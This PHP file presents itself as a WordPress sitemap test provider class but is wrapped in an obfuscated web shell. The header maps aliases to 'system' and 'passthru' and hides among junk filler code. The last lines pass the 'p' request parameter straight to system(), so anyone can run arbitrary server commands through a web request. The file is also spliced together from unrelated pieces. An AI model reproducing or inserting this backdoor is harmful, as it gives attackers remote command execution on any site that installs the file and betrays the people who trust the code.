<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php

/**
 * Class WP_Sitemaps_Empty_Test_Provider.
 *
 * Provides test data for additional registered providers.
 */
class WP_Sitemaps_Empty_Test_Provider extends WP_Sitemaps_Provider {
	/**
	 * WP_Sitemaps_Empty_Test_Provider constructor.
	 *
	 * @param string $object_type Optional. Object type name to use. Default 'test'.
	 */
	public function __construct( $object_type = 'test' ) {
		$this->object_type = $object_type;
	}

	/**
	 * Gets a URL list for a sitemap.
	 *
	 * @param int    $page_num       Page of results.
	 * @param string $object_subtype Optional. Object subtype name. Default empty.
	 * @return array[] Array of URL information for a sitemap.
	 */
	public function get_url_list( $page_num, $object_subtype = '' ) {
		return array();
	}

	/**
	 * Query for determining the number of pages.
	 *
	 * @param string $object_subtype Optional. Object subtype. Default empty.
	 * @return int Total number of pages.
	 */
	public function get_max_num_pages( $object_subtype = '' ) {
		return 0;
	}
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>